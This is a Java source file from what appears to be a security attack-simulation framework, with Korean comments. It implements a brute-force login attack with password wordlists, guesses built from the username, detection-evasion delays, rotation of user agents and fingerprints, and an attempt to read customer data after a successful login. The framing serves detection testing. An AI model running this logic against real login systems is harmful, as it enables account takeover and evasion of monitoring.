package io.contexa.contexacore.simulation.strategy.impl;

import io.contexa.contexacore.domain.entity.AttackResult;
import io.contexa.contexacore.simulation.client.SimulationClient;
import io.contexa.contexacore.simulation.domain.LoginAttempt;
import io.contexa.contexacore.simulation.strategy.IAuthenticationAttack;
import io.contexa.contexacore.simulation.publisher.SimulationEventPublisher;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * 브루트포스 공격 전략 구현
 *
 * 다양한 패스워드를 시도하여 계정을 탈취하려는 공격을 시뮬레이션합니다.
 * 지능형 브루트포스, 탐지 회피, 패턴 기반 공격 등을 포함합니다.
 *
 * @author AI3Security
 * @since 1.0.0
 */
@Slf4j
@Component
public class BruteForceStrategy extends BaseAttackStrategy implements IAuthenticationAttack {

    private SimulationClient simulationClient;
    private SimulationEventPublisher eventPublisher;
    
    public BruteForceStrategy() {
        // 기본 생성자
    }
    
    public BruteForceStrategy(SimulationClient simulationClient) {
        this.simulationClient = simulationClient;
    }
    
    @Value("${simulation.attack.bruteforce.delay-ms:100}")
    private int delayMs;
    
    @Value("${simulation.attack.bruteforce.max-attempts:50}")
    private int maxAttempts;
    
    @Value("${simulation.attack.bruteforce.stealth-mode:true}")
    private boolean stealthMode;
    
    // 공격에 사용할 패스워드 목록들
    private static final List<String> COMMON_PASSWORDS = Arrays.asList(
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey",
        "letmein", "696969", "shadow", "master", "666666"
    );
    
    private static final List<String> SEASON_PASSWORDS = generateSeasonPasswords();
    private static final List<String> KEYBOARD_PATTERNS = Arrays.asList(
        "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx", "qazwsx",
        "qwerty123", "1q2w3e4r", "qweasd", "qwe123", "asd123"
    );
    
    @Override
    public void setEventPublisher(SimulationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }

    @Override
    public AttackResult execute(AttackContext context) {
        log.warn("=== 브루트포스 공격 시작: target={} ===", context.getTargetUser());

        AttackResult result = AttackResult.builder()
            .attackId(UUID.randomUUID().toString())
            .campaignId(context.getCampaignId())
            .type(AttackResult.AttackType.BRUTE_FORCE)
            .attackName("Intelligent Brute Force Attack")
            .executionTime(LocalDateTime.now())
            .targetUser(context.getTargetUser())
            .attackVector("login")
            .sourceIp(context.getSourceIp() != null ? context.getSourceIp() : "192.168.1." + ThreadLocalRandom.current().nextInt(2, 254))
            .build();
        
        long startTime = System.currentTimeMillis();
        
        try {
            // 공격 패턴 선택
            BruteForcePattern pattern = selectPattern(context);
            List<String> passwords = generatePasswordList(context, pattern);
            
            int attemptCount = 0;
            boolean success = false;
            
            for (String password : passwords) {
                if (attemptCount >= maxAttempts) {
                    log.info("최대 시도 횟수 도달: {}", maxAttempts);
                    break;
                }
                
                // 로그인 시도
                LoginAttempt attempt = attemptLogin(context.getTargetUser(), password);
                attempt.setAttackId(result.getAttackId());
                attempt.setFailureCount(attemptCount);

                if (attempt.isSuccessful()) {
                    log.error("!!! 브루트포스 성공: user={}, password={}, attempts={}",
                        context.getTargetUser(), password, attemptCount + 1);

                    // 로그인 성공 후 @Protectable로 보호된 고객 데이터 접근 시도
                    String customerId = extractCustomerId(context.getTargetUser());
                    boolean dataBreached = attemptCustomerDataAccess(
                        customerId,
                        "BRUTE_FORCE",
                        context
                    );

                    result.setAttackSuccessful(true);
                    result.setDataBreached(dataBreached);
                    result.setBreachedRecordCount(dataBreached ? 1 : 0);
                    result.setSuccessCriteria("Found valid credentials and attempted data access");

                    // 성공 이벤트 발행 (비정상적 로그인)
                    if (eventPublisher != null) {
                        eventPublisher.publishAuthenticationSuccess(
                            result,
                            context.getTargetUser(),
                            result.getSourceIp(),
                            context.getSessionId(),
                            true, // anomaly detected
                            0.2 // low trust score
                        );
                    }

                    success = true;
                    break;
                } else {
                    // 실패 이벤트 발행
                    if (eventPublisher != null) {
                        eventPublisher.publishAuthenticationFailure(
                            result,
                            context.getTargetUser(),
                            result.getSourceIp(),
                            "Invalid password - brute force attempt",
                            attemptCount + 1
                        );
                    }
                }

                attemptCount++;
                
                // 지능형 지연 (탐지 회피)
                if (stealthMode) {
                    applyIntelligentDelay(attemptCount, pattern);
                } else {
                    Thread.sleep(delayMs);
                }
                
                // 가끔 User-Agent 변경
                if (attemptCount % 10 == 0) {
                    simulationClient.clearSession();
                }
            }
            
            result.setAttemptCount(attemptCount);
            result.setDuration(System.currentTimeMillis() - startTime);
            result.setAttackSuccessful(success);
            
            // 위험도 평가
            calculateRiskScore(result, attemptCount, success);
            
        } catch (Exception e) {
            log.error("브루트포스 공격 중 오류: {}", e.getMessage(), e);
            result.setFailureReason(e.getMessage());
        }
        
        log.warn("=== 브루트포스 공격 종료: attempts={}, success={}, duration={}ms ===",
            result.getAttemptCount(), result.isAttackSuccessful(), result.getDuration());
        
        return result;
    }
    
    @Override
    public LoginAttempt attemptLogin(String username, String password) {
        LoginAttempt attempt = LoginAttempt.builder()
            .attemptId(UUID.randomUUID().toString())
            .username(username)
            .password(password) // 실제로는 해시만 저장
            .timestamp(LocalDateTime.now())
            .sourceIp(simulationClient.getBaseUrl())
            .deviceFingerprint(generateDeviceFingerprint())
            .userAgent(generateUserAgent())
            .build();
        
        try {
            ResponseEntity<String> response = simulationClient.loginJson(username, password);
            
            attempt.setSuccessful(response.getStatusCode() == HttpStatus.OK);
            attempt.setFailureReason(response.getStatusCode().toString());
            
            // 행동 분석 데이터 추가
            attempt.setPasswordLength(password.length());
            attempt.setTypingSpeed(calculateTypingSpeed(password));
            attempt.setPastedPassword(false); // 시뮬레이션에서는 타이핑
            
            // 위험 평가
            attempt.setThreatCategory("bruteforce");
            attempt.setRiskScore(0.8); // 브루트포스는 고위험
            attempt.setRiskLevel("HIGH");
            
        } catch (Exception e) {
            attempt.setSuccessful(false);
            attempt.setFailureReason(e.getMessage());
        }
        
        return attempt;
    }
    
    @Override
    public List<LoginAttempt> attemptMultipleLogins(List<Credential> credentials) {
        List<LoginAttempt> attempts = new ArrayList<>();
        
        for (Credential cred : credentials) {
            LoginAttempt attempt = attemptLogin(cred.getUsername(), cred.getPassword());
            attempts.add(attempt);
            
            try {
                // 각 시도 사이 지연
                Thread.sleep(ThreadLocalRandom.current().nextInt(100, 500));
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        
        return attempts;
    }
    
    /**
     * 브루트포스 패턴 선택
     */
    private BruteForcePattern selectPattern(AttackContext context) {
        String patternName = context.getParameter("pattern", String.class);
        
        if (patternName != null) {
            return BruteForcePattern.valueOf(patternName.toUpperCase());
        }
        
        // 기본적으로 지능형 패턴 사용
        return BruteForcePattern.INTELLIGENT;
    }
    
    /**
     * 패스워드 목록 생성
     */
    private List<String> generatePasswordList(AttackContext context, BruteForcePattern pattern) {
        List<String> passwords = new ArrayList<>();
        String targetUser = context.getTargetUser();
        
        switch (pattern) {
            case DICTIONARY:
                passwords.addAll(COMMON_PASSWORDS);
                break;
                
            case INTELLIGENT:
                // 사용자 정보 기반 패스워드 생성
                passwords.addAll(generateUserBasedPasswords(targetUser));
                passwords.addAll(SEASON_PASSWORDS);
                passwords.addAll(generateCompanyPasswords());
                break;
                
            case HYBRID:
                // 딕셔너리 + 변형
                for (String base : COMMON_PASSWORDS) {
                    passwords.add(base);
                    passwords.add(base + "123");
                    passwords.add(base + "!");
                    passwords.add(base + "2024");
                    passwords.add(Character.toUpperCase(base.charAt(0)) + base.substring(1));
                }
                break;
                
            case PATTERN_BASED:
                passwords.addAll(KEYBOARD_PATTERNS);
                passwords.addAll(generateNumericPatterns());
                break;
                
            case RANDOM:
                for (int i = 0; i < 50; i++) {
                    passwords.add(generateRandomPassword());
                }
                break;
        }
        
        return passwords;
    }
    
    /**
     * 사용자 정보 기반 패스워드 생성
     */
    private List<String> generateUserBasedPasswords(String username) {
        List<String> passwords = new ArrayList<>();
        
        if (username == null || username.isEmpty()) {
            return passwords;
        }
        
        // 사용자명 기반 변형
        String baseName = username.split("@")[0].toLowerCase();
        passwords.add(baseName);
        passwords.add(baseName + "123");
        passwords.add(baseName + "1234");
        passwords.add(baseName + "!");
        passwords.add(baseName + "@123");
        passwords.add(baseName + "2024");
        passwords.add(baseName + "2023");
        
        // 이름 분리 (john.doe -> john, doe)
        if (baseName.contains(".")) {
            String[] parts = baseName.split("\\.");
            for (String part : parts) {
                passwords.add(part);
                passwords.add(Character.toUpperCase(part.charAt(0)) + part.substring(1));
                passwords.add(part + "123");
            }
        }
        
        return passwords;
    }
    
    /**
     * 계절 기반 패스워드 생성
     */
    private static List<String> generateSeasonPasswords() {
        List<String> passwords = new ArrayList<>();
        String[] seasons = {"Spring", "Summer", "Fall", "Winter", "Autumn"};
        int currentYear = LocalDateTime.now().getYear();
        
        for (String season : seasons) {
            passwords.add(season + currentYear);
            passwords.add(season + (currentYear - 1));
            passwords.add(season.toLowerCase() + currentYear);
            passwords.add(season + "@" + currentYear);
            passwords.add(season + "!" + currentYear);
        }
        
        return passwords;
    }
    
    /**
     * 회사 관련 패스워드 생성
     */
    private List<String> generateCompanyPasswords() {
        return Arrays.asList(
            "Company123", "Company@2024", "Welcome123", "Welcome@2024",
            "Admin123", "Admin@2024", "Password1", "Password123!",
            "Temp123!", "Change123", "Initial123", "Default123"
        );
    }
    
    /**
     * 숫자 패턴 생성
     */
    private List<String> generateNumericPatterns() {
        List<String> patterns = new ArrayList<>();
        patterns.add("123456789");
        patterns.add("987654321");
        patterns.add("11111111");
        patterns.add("12341234");
        patterns.add("00000000");
        patterns.add("12121212");
        patterns.add("13579");
        patterns.add("24680");
        return patterns;
    }
    
    /**
     * 랜덤 패스워드 생성
     */
    private String generateRandomPassword() {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%";
        StringBuilder password = new StringBuilder();
        Random random = ThreadLocalRandom.current();
        
        int length = random.nextInt(6, 12);
        for (int i = 0; i < length; i++) {
            password.append(chars.charAt(random.nextInt(chars.length())));
        }
        
        return password.toString();
    }
    
    /**
     * 지능형 지연 적용
     */
    private void applyIntelligentDelay(int attemptCount, BruteForcePattern pattern) throws InterruptedException {
        if (pattern == BruteForcePattern.INTELLIGENT) {
            // 점진적으로 지연 증가 (탐지 회피)
            if (attemptCount < 5) {
                Thread.sleep(100);
            } else if (attemptCount < 10) {
                Thread.sleep(500);
            } else if (attemptCount < 20) {
                Thread.sleep(2000);
            } else {
                // 20회 이상 시 랜덤 지연
                Thread.sleep(ThreadLocalRandom.current().nextInt(3000, 10000));
            }
        } else {
            Thread.sleep(delayMs);
        }
    }
    
    /**
     * 타이핑 속도 계산 (시뮬레이션)
     */
    private double calculateTypingSpeed(String password) {
        // 평균 타이핑 속도: 40 WPM
        // 1 character = ~150ms
        return password.length() * 150.0 / 1000.0; // 초 단위
    }
    
    /**
     * 장치 지문 생성
     */
    private String generateDeviceFingerprint() {
        return "device-" + UUID.randomUUID().toString().substring(0, 8);
    }
    
    /**
     * User-Agent 생성
     */
    private String generateUserAgent() {
        List<String> agents = Arrays.asList(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0"
        );
        return agents.get(ThreadLocalRandom.current().nextInt(agents.size()));
    }
    
    /**
     * 위험도 계산
     */
    private void calculateRiskScore(AttackResult result, int attempts, boolean success) {
        double riskScore;
        
        if (success) {
            riskScore = 1.0; // 성공한 브루트포스는 최고 위험
        } else if (attempts > 30) {
            riskScore = 0.9; // 많은 시도는 높은 위험
        } else if (attempts > 10) {
            riskScore = 0.7;
        } else {
            riskScore = 0.5;
        }
        
        result.setRiskScore(riskScore);
        result.setRiskLevel(AttackResult.RiskLevel.fromScore(riskScore).name());
    }
    
    // 인터페이스 구현 메서드들
    
    @Override
    public AttackResult.AttackType getType() {
        return AttackResult.AttackType.BRUTE_FORCE;
    }
    
    @Override
    public int getPriority() {
        return 90; // 높은 우선순위
    }
    
    @Override
    public AttackCategory getCategory() {
        return AttackCategory.AUTHENTICATION;
    }
    
    @Override
    public boolean validateContext(AttackContext context) {
        return context.getTargetUser() != null && !context.getTargetUser().isEmpty();
    }
    
    @Override
    public long getEstimatedDuration() {
        return maxAttempts * delayMs;
    }
    
    @Override
    public String getDescription() {
        return "Intelligent brute force attack with multiple password generation strategies";
    }
    
    @Override
    public RequiredPrivilege getRequiredPrivilege() {
        return RequiredPrivilege.NONE; // 브루트포스는 권한 불필요
    }
    
    @Override
    public String getSuccessCriteria() {
        return "Successfully find valid credentials through password guessing";
    }
    
    // 추가 인터페이스 메서드들
    
    @Override
    public String manipulateSessionToken(String sessionToken) {
        // 브루트포스는 세션 조작 불필요
        return sessionToken;
    }
    
    @Override
    public boolean attemptMfaBypass(String username, String mfaCode) {
        // MFA 우회는 별도 전략에서 구현
        return false;
    }
    
    @Override
    public int analyzePasswordComplexity(String password) {
        int complexity = 0;
        
        if (password.matches(".*[a-z].*")) complexity += 20;
        if (password.matches(".*[A-Z].*")) complexity += 20;
        if (password.matches(".*[0-9].*")) complexity += 20;
        if (password.matches(".*[!@#$%^&*].*")) complexity += 20;
        if (password.length() >= 8) complexity += 10;
        if (password.length() >= 12) complexity += 10;
        
        return Math.min(complexity, 100);
    }
    
    @Override
    public List<LoginAttempt> generateLoginPattern(LoginPatternType patternType) {
        // 패턴별 로그인 시도 생성
        List<LoginAttempt> attempts = new ArrayList<>();
        // 구현 생략 (필요시 추가)
        return attempts;
    }
    
    /**
     * 사용자명에서 고객 ID 추출
     */
    private String extractCustomerId(String username) {
        // 이메일에서 ID 추출 또는 기본 ID 생성
        if (username != null && username.contains("@")) {
            String baseName = username.split("@")[0];
            return "customer-" + baseName.hashCode() % 10000;
        }
        return "customer-" + ThreadLocalRandom.current().nextInt(1, 1000);
    }

    /**
     * 브루트포스 패턴 유형
     */
    private enum BruteForcePattern {
        DICTIONARY,    // 사전 기반
        INTELLIGENT,   // 지능형 (사용자 정보 활용)
        HYBRID,        // 혼합형
        PATTERN_BASED, // 패턴 기반
        RANDOM         // 무작위
    }
}